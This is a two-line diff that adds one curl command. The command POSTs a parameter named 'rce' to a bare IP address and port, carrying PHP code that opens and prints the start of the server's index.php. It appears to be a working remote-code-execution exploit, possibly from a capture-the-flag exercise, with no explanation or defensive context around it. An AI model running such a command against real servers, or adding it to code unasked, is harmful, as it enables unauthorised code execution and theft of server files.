@@ -1,0 +1,2 @@
+curl -X POST http://54.177.207.109:23333/ --data "rce=echo fread(fopen('index.php','r'),50);"
+
